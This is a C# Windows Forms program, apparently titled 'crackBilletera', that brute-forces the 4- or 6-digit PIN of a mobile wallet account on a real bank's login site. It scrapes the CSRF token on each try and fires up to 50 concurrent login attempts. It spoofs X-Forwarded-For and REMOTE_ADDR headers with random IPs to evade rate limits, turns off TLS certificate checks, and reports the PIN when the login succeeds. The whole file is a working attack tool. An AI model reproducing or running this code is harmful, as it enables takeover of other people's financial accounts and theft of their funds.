using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Configuration;
using System.Net.Configuration;
using System.Web;
using System.Threading;
using System.Media;
using System.Diagnostics;

namespace crackBilletera
{
    public partial class Form1 : Form
    {
        int procesosIniciados;
        CookieContainer cookieContainer;
        CancellationTokenSource ct;
        int digitos;
        int numeroBilletera;
        int counter;
        bool found = false;
        private static Random rng = new Random();

        public Form1()
        {
            InitializeComponent();

            procesosIniciados = 0;

            var config = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
            var settings = (SettingsSection)config.GetSection("system.net/settings");
            settings.HttpWebRequest.UseUnsafeHeaderParsing = false;
            config.Save(ConfigurationSaveMode.Modified);
            ConfigurationManager.RefreshSection("system.net/settings");

            ct = new CancellationTokenSource();
            cookieContainer = new CookieContainer();
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

        }

        void log(string message)
        {
            if (found)
                return;
            txtHistorial.BeginInvoke((MethodInvoker)(() => {
                txtHistorial.AppendText(message + "\r\n");
            }));
        }

        private void btnIniciar_Click(object sender, EventArgs e)
        {
            if (btnIniciar.Text.Equals("Iniciar"))
            {
                procesosIniciados = 0;
                found = false;
                counter = 0;
                lblResultado.Text = "Resultado...";
                btnIniciar.Text = "Detener";
                lblAvance.Text = "";
                progressBar1.Value = 0;
            }
            else
            {
                btnIniciar.Text = "Iniciar";
                found = true;
                ct.Cancel();
            }

            try
            {
                numeroBilletera = int.Parse(txtNumeroBilletera.Text);
                digitos = int.Parse(comboDigitos.Text);
            }
            catch
            {
                MessageBox.Show("Por favor complete el formulario");
                return;
            }

            if( txtNumeroBilletera.Text.Length != 8 || 
                txtNumeroBilletera.Text.Substring(0, 1) != "8")
            {
                MessageBox.Show("El número de billetera es inválido");
                return;
            }

            if( comboDigitos.Text != "4" && comboDigitos.Text != "6" )
            {
                MessageBox.Show( "La cantidad de digitos es inválida" );
                return;
            }

            int total = (int)Math.Pow(10, digitos);
            progressBar1.Maximum = total;

            List<int> myList = new List<int> { };

            for (int i = 0; i < total; i++)
                myList.Add(i);

            if( ordenAleatorio.Checked )
                myList.Shuffle();

            Task.Run(() =>
            {
                foreach (int i in myList)
                {
                    if (found)
                        break;

                    counter++;
                    
                    progressBar1.Invoke((MethodInvoker)(() => { 
                        progressBar1.Value = counter;
                    }));
                    
                    lblAvance.Invoke((MethodInvoker)(() => {
                        lblAvance.Text = counter + " / " + total;
                    }));

                    while (procesosIniciados == 50)
                        Thread.Sleep(1000);
                    
                    string pin = new String('0', digitos - i.ToString().Length) + i.ToString();
                    
                    log("Probando PIN: " + pin);

                    var r = new Random();

                    string ip =  r.Next(190, 254) + "." +
                                 r.Next(0, 254) + "." +
                                 r.Next(0, 254) + "." +
                                 r.Next(100, 254);

                    Task.Run(() => {
                        login(numeroBilletera, pin, ip);
                    });
                    
                    procesosIniciados++;
                }
            }, ct.Token);
        }

        string getToken(string ip)
        {
            using (NewWebClient wc = new NewWebClient(cookieContainer))
            {
                wc.Headers["X-Forwarded-For"] = ip;
                wc.Headers["User-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36";
                wc.Headers["Referer"] = "https://billeteramovil.grupopromerica.com";

                string info = "";

                try
                {
                    info = wc.DownloadString(new Uri("https://billeteramovil.grupopromerica.com"));
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    try
                    {
                        Thread.Sleep(1000);
                        info = wc.DownloadString(new Uri("https://billeteramovil.grupopromerica.com"));
                    }
                    catch(Exception ex2)
                    {
                        Console.WriteLine(ex2.Message);
                        return "";
                    }
                }

                string[] info_parts = Regex.Split(info, "<input name=\"authenticity_token\" type=\"hidden\" value=\"");
                info = info_parts[1];
                info_parts = Regex.Split(info, "\"");
                info = info_parts[0];
                return info;
            }
        }

        void login(int numero, string pin, string ip)
        {
            string token = getToken(ip);
            using(NewWebClient wc = new NewWebClient(cookieContainer))
            {
                wc.Headers["REMOTE_ADDR"] = ip;
                wc.Headers["X-Forwarded-For"] = ip;
                wc.Headers["Referer"] = "https://billeteramovil.grupopromerica.com";
                wc.Headers["User-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36";
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";

                string info = "";

                try { 
                    info = wc.UploadString("https://billeteramovil.grupopromerica.com/BPRO/login", "utf8=1&authenticity_token=" + token + "&wallet[identifier]=" + numero + "&wallet[password]=" + pin + "&commit=iniciar+sesión"); 
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    try
                    {
                        Thread.Sleep(1000);
                        info = wc.UploadString("https://billeteramovil.grupopromerica.com/BPRO/login", "utf8=1&authenticity_token=" + token + "&wallet[identifier]=" + numero + "&wallet[password]=" + pin + "&commit=iniciar+sesión");
                    }
                    catch(Exception ex2)
                    {
                        Console.WriteLine(ex2.Message);
                        info = "";
                    }
                }

                if (info.Contains("Ingreso exitoso"))
                {
                    SystemSounds.Beep.Play();
                    ct.Cancel();
                    found = true;
                    lblResultado.Invoke((MethodInvoker)(() => {
                        lblResultado.Text = "PIN encontrado: " + pin;
                    }));
                    MessageBox.Show("El código de billetera es: " + pin);
                }
                else
                    log("PIN " + pin + " Inválido");

                procesosIniciados--;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://carlosernesto.net");
        }
    }
    public static class ThreadSafeRandom
    {
        [ThreadStatic] private static Random Local;

        public static Random ThisThreadsRandom
        {
            get { return Local ?? (Local = new Random(unchecked(Environment.TickCount * 31 + Thread.CurrentThread.ManagedThreadId))); }
        }
    }
    static class MyExtensions
    {
        public static void Shuffle<T>(this IList<T> list)
        {
            int n = list.Count;
            while (n > 1)
            {
                n--;
                int k = ThreadSafeRandom.ThisThreadsRandom.Next(n + 1);
                T value = list[k];
                list[k] = list[n];
                list[n] = value;
            }
        }
    }
}
